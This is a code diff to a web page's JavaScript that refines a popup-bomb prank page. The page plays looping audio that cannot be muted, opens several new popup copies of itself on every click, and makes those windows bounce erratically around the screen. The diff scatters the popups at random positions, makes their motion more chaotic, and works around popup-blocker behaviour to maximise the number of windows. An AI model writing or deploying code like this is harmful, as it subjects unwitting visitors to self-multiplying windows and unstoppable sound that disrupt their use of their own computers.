@@ -740,33 +740,42 @@ html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#
 (function(){
   var snd = document.getElementById("snd");
   var isPopup = !!window.opener;
+  var W = 357, H = 330;
 
-  // Song: autoplay + loop, no mute, main window only (popups silent). Audio uses
-  // "sticky" activation, so it does NOT consume the click -- it can start on the
-  // same click that also spawns popups.
+  function rnd(a,b){ return Math.random()*(b-a)+a; }
+  function clamp(v,a,b){ return v<a?a:(v>b?b:v); }
+  function speed(){ return (Math.random()<0.5?-1:1)*rnd(6,14); }
+
+  // Song: autoplay + loop, no mute, main window only (popups silent). Sticky
+  // activation, so it starts on the same click that also opens popups.
   function playAudio(){ if(isPopup) return; try{ var p=snd.play(); if(p&&p.catch) p.catch(function(){}); }catch(e){} }
 
-  // Each click opens more windows of this same page. (Browsers' popup blockers
-  // usually allow only the FIRST per click unless the user allows pop-ups for
-  // the site -- then all of these open.)
-  function openWindow(){ try{ window.open("/","_blank","menubar=no,status=no,toolbar=no,resizable=no,scrollbars=no,width=357,height=330"); }catch(e){} }
+  // Each click opens more windows of this page, at RANDOM positions so multiple
+  // popups scatter instead of stacking on the same spot. (How many actually open
+  // per click is capped by the browser's popup blocker unless pop-ups are allowed.)
+  function openWindow(){
+    var x = Math.floor(rnd(0, Math.max(1, screen.availWidth  - W)));
+    var y = Math.floor(rnd(0, Math.max(1, screen.availHeight - H)));
+    try{ window.open("/","_blank","menubar=no,status=no,toolbar=no,resizable=no,scrollbars=no,width="+W+",height="+H+",left="+x+",top="+y); }catch(e){}
+  }
   function proCreate(n){ for(var i=0;i<n;i++) openWindow(); }
 
-  // --- erratic bouncing (popups only; script-opened windows can be moved) ---
-  var W=357, H=330;
-  function rnd(a,b){ return Math.random()*(b-a)+a; }
-  function speed(){ return (Math.random()<0.5?-1:1)*rnd(8,20); }
-  var px=(typeof window.screenX==="number"?window.screenX:rnd(0,Math.max(1,screen.availWidth-W)));
-  var py=(typeof window.screenY==="number"?window.screenY:rnd(0,Math.max(1,screen.availHeight-H)));
-  var vx=speed(), vy=speed();
+  // Erratic random-walk bounce (popups only). Velocity is perturbed every frame
+  // on BOTH axes, so X wanders just like Y instead of gliding straight.
+  var px = (typeof window.screenX==="number"?window.screenX:rnd(0,Math.max(1,screen.availWidth-W)));
+  var py = (typeof window.screenY==="number"?window.screenY:rnd(0,Math.max(1,screen.availHeight-H)));
+  var vx = speed(), vy = speed();
   function playBall(){
     var sw=screen.availWidth, sh=screen.availHeight;
-    px+=vx; py+=vy;
-    if(px<=0){ px=0; vx=Math.abs(speed()); }
-    else if(px>=sw-W){ px=sw-W; vx=-Math.abs(speed()); }
-    if(py<=0){ py=0; vy=Math.abs(speed()); }
-    else if(py>=sh-H){ py=sh-H; vy=-Math.abs(speed()); }
-    if(Math.random()<0.05){ vx=speed(); vy=speed(); }   // random course changes mid-flight
+    vx = clamp(vx + rnd(-3,3), -26, 26);
+    vy = clamp(vy + rnd(-3,3), -26, 26);
+    if(Math.abs(vx)<2) vx = speed();
+    if(Math.abs(vy)<2) vy = speed();
+    px += vx; py += vy;
+    if(px<=0){ px=0; vx=Math.abs(vx); }
+    else if(px>=sw-W){ px=sw-W; vx=-Math.abs(vx); }
+    if(py<=0){ py=0; vy=Math.abs(vy); }
+    else if(py>=sh-H){ py=sh-H; vy=-Math.abs(vy); }
     try{ window.moveTo(Math.round(px), Math.round(py)); }catch(e){}
     setTimeout(playBall, 16);
   }
@@ -775,7 +784,6 @@ html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#
     window.addEventListener("load", playBall);
     document.addEventListener("click", function(){ proCreate(3); });
   } else {
-    // No auto-fullscreen (per request) so the click's activation goes to popups.
     window.addEventListener("pointerdown", playAudio, true);
     window.addEventListener("keydown", playAudio, true);
     document.addEventListener("click", function(){ playAudio(); proCreate(6); });
